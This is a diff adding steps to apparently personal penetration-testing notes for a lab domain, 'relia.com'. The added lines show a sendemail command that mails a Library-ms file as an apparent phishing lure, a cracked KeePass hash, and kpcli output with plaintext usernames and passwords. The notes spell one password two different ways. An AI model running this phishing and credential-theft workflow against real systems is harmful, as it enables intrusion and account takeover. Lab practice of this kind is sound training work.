@@ -165,6 +165,32 @@ smtp-enum-users:
 |   user
 |   web
 |_  test
+
+sendemail -t jim@relia.com -f maildmz@relia.com -s 192.168.157.189 -u "hey hey" -a config.Library-ms
+
+Found database.kdbx:
+$keepass$*2*60*0*ed890395c5503e50453897e48fd2d79ece2ae3466b51b6fb941cd413f5c89b43*3edacb91f15bae05d3fd546f201cd8924676b662f6101ba57155e0f4aeae9b61*7a963146ec300519645fbc90ca4e258d*90939579da95cd23a9c90aef5a7a507d7c9ee647ed47c0fa05729a1262d7d73e*e97f9fe2f7a1efe24b054dfcb47e8edab5dd7eb96c5731f32e64a9d3a1db5dcf:mercedes1
+
+
+kpcli:/Database/General> show -f 0
+
+Title: LOGIN local admin
+Uname: dmzadmin
+ Pass: SlimGodhoodMope
+  URL: 
+Notes: 
+
+kpcli:/Database/General> show -f 1
+
+Title: User Password
+Uname: jim@relia.com
+ Pass: Castello1!
+  URL: 
+Notes: 
+
+
+jim:Casello1!
+dmzadmin:SlimGodhoodMope
 ```
 
 
@@ -228,3 +254,4 @@ htdocs/cms/data/email.conf.bak
 
 maildmz@relia.com:DPuBT9tGCBrTbR
 ```
+
